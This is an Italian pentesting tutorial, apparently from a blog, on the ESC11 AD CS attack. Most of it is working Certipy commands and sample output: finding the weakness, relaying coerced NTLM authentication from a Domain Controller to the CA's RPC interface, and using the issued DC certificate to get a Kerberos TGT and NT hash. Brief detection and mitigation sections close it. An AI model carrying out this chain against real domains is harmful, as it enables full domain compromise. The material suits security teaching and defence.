---
title: 'ESC11 ADCS: NTLM Relay verso RPC Enrollment della Certificate Authority'
slug: esc11-adcs
description: >-
  ESC11 sfrutta NTLM relay verso l’interfaccia RPC di AD CS quando la CA non
  richiede encryption. Guida pratica con Certipy per ottenere certificati
  privilegiati.
image: /BCO.69cae626-2e95-48f7-8cbd-824dad0ae6f0.webp
draft: false
date: 2026-03-09T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - ad
  - adcs
  - certipy
  - esc
---

ESC11 è una tecnica di **Active Directory Privilege Escalation tramite AD CS** che sfrutta **NTLM Relay verso l’interfaccia RPC della Certificate Authority**. A differenza di [ESC8](https://hackita.it/articoli/esc8-adcs), che colpisce gli endpoint web `/certsrv/`, ESC11 prende di mira direttamente l’interfaccia **RPC usata dai client per richiedere certificati**.

Questa interfaccia utilizza RPC per operazioni di enrollment tramite API come:

* `ICertRequestD`
* `ICertPassage`
* interfaccia ICPR (ICertPassage Remote)

Il problema nasce quando la CA **non richiede encryption per le richieste RPC**. In condizioni sicure la CA dovrebbe imporre il livello di autenticazione:

```
RPC_C_AUTHN_LEVEL_PKT_PRIVACY
```

che garantisce **RPC traffic encryption**.

Se questa protezione non è attiva, un attaccante può effettuare **NTLM relay verso la CA RPC endpoint** e richiedere certificati impersonando un account privilegiato.

La configurazione vulnerabile dipende dal flag nel registro della CA:

```text
HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA-NAME>\InterfaceFlags
```

Se il flag

```
IF_ENFORCEENCRYPTICERTREQUEST
```

non è attivo, la CA può accettare richieste RPC senza encryption.

***

# Identificazione con Certipy

Certipy può rilevare ESC11 verificando se la CA **non richiede encryption per RPC requests**.

```bash
certipy find -u 'user@corp.local' -p 'Password123' -dc-ip 10.0.0.100 -vulnerable -enabled -stdout
```

Output tipico:

```
Certificate Authorities

CA Name : CORP-CA
DNS Name : CA.CORP.LOCAL

Request Disposition : Issue
Enforce Encryption for Requests : Disabled

[!] Vulnerabilities
  ESC11 : Encryption is not enforced for ICPR (RPC) requests
```

Indicatori chiave:

* `Enforce Encryption for Requests : Disabled`
* `[!] Vulnerabilities ESC11`

***

# Exploit ESC11 ADCS con Certipy

L’attacco è simile a ESC8 ma utilizza **RPC invece di HTTP**.

Serve:

1. coercion NTLM
2. relay verso RPC

***

## Step 1 — Avvia NTLM relay verso RPC

```bash
certipy relay \
-target 'rpc://10.0.0.50' -ca 'CORP-CA' \
-template 'DomainController'
```

Output iniziale:

```
Targeting rpc://10.0.0.50 (ESC11)
Listening on 0.0.0.0:445
Setting up SMB Server on port 445
```

Se la porta 445 non è utilizzabile su Linux:

```bash
echo 0 | sudo tee /proc/sys/net/ipv4/ip_unprivileged_port_start
```

***

## Step 2 — Forzare autenticazione NTLM

Serve un tool esterno come:

* PetitPotam
* Coercer

per costringere un **Domain Controller o Domain Admin** ad autenticarsi verso il relay.

***

## Step 3 — Relay e richiesta certificato

Quando l’autenticazione arriva, Certipy la inoltra alla CA tramite RPC.

Output tipico:

```
Received connection from 10.0.0.100
Authenticating against rpc://10.0.0.50 as CORP/DC$ SUCCEED

Requesting certificate for user 'DC$' with template 'DomainController'

Request ID is 1
Successfully requested certificate
Got certificate with DNS Host Name 'DC.CORP.LOCAL'

Saving certificate and private key to 'dc.pfx'
```

Ora l’attaccante possiede il certificato **dc.pfx**.

***

# Autenticazione con il certificato

```bash
certipy auth -pfx 'dc.pfx' -dc-ip '10.0.0.100'
```

Output:

```
Got TGT
Saving credential cache to dc.ccache
Got hash for dc$
```

Risultato:

* **Kerberos TGT**
* **NT hash**
* **Domain compromise**

***

# Detection ESC11 ADCS

Controllare:

* configurazione `InterfaceFlags`
* certificati rilasciati tramite RPC
* richieste certificate sospette

Indicatori utili:

* autenticazioni NTLM verso la CA
* richieste certificate con template **DomainController**

***

# Mitigation ESC11 ADCS

La mitigazione principale è **forzare encryption sulle richieste RPC**.

Eseguire sul server CA:

```bash
certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST
net stop certsvc
net start certsvc
```

Questo forza l’uso di:

```
RPC_C_AUTHN_LEVEL_PKT_PRIVACY
```

che impedisce NTLM relay verso l’interfaccia RPC.

***

# FAQ — ESC11 ADCS

### Cos'è ESC11?

Un attacco di **NTLM relay verso l’interfaccia RPC della Certificate Authority**.

### ESC11 è simile a ESC8?

Sì, ma [ESC8](https://hackita.it/articoli/esc8-adcs) colpisce gli endpoint web `/certsrv/`.

ESC11 colpisce **RPC enrollment interface**.

### ESC11 permette Domain Admin?

Sì. Se viene relayato un **Domain Controller account**, l’attaccante può ottenere un certificato DC.

### ESC11 richiede accesso iniziale?

No. Basta coercion NTLM verso il relay.

***

**Key Takeaway:** se la CA non richiede **RPC encryption**, un attaccante può relayare NTLM verso l’interfaccia RPC e ottenere certificati privilegiati.

***

> ESC11 è uno dei certificate attacks più potenti contro AD CS.
> Per vedere tutte le tecniche consulta la guida completa:
> [https://hackita.it/articoli/adcs-esc1-esc16](https://hackita.it/articoli/adcs-esc1-esc16)Continua con le escalation successive:
> [https://hackita.it/articoli/esc12-adcs](https://hackita.it/articoli/esc12-adcs) · [https://hackita.it/articoli/esc13-adcs](https://hackita.it/articoli/esc13-adcs)Supporta HackIta:
> [https://hackita.it/supporto](https://hackita.it/supporto)Vuoi imparare pentesting Active Directory o testare la sicurezza della tua infrastruttura?
> [https://hackita.it/servizi](https://hackita.it/servizi)Riferimenti tecnici:
> [https://specterops.io/blog/2021/06/17/certified-pre-owned/](https://specterops.io/blog/2021/06/17/certified-pre-owned/)
> [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)
> [https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/)
